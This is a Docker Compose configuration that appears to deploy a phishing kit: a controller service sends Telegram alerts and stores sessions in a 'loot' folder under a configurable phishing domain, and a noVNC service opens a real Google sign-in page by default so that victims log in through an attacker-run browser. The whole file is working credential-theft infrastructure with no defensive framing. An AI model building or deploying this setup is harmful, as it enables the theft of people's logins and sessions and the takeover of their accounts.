services:
  # Controller - manages sessions, Telegram alerts, status page
  controller:
    build: ./controller
    environment:
      - TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
      - TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID}
      - PHISHING_DOMAIN=${PHISHING_DOMAIN:-localhost}
    volumes:
      - ./data:/app/data
      - ./loot:/app/loot
    ports:
      - "80:5000"
    networks:
      - phishnet

  # noVNC session
  novnc:
    build: ./novnc
    environment:
      - TARGET_URL=${TARGET_URL:-https://accounts.google.com}
      - DISPLAY=:1
      - SESSION_ID=session_1
      - CONTROLLER_URL=http://controller:5000
    volumes:
      - ./loot:/app/loot
      - ./novnc/scripts:/app/scripts:ro
    ports:
      - "6080:6080"
    depends_on:
      - controller
    networks:
      - phishnet

networks:
  phishnet:
    driver: bridge
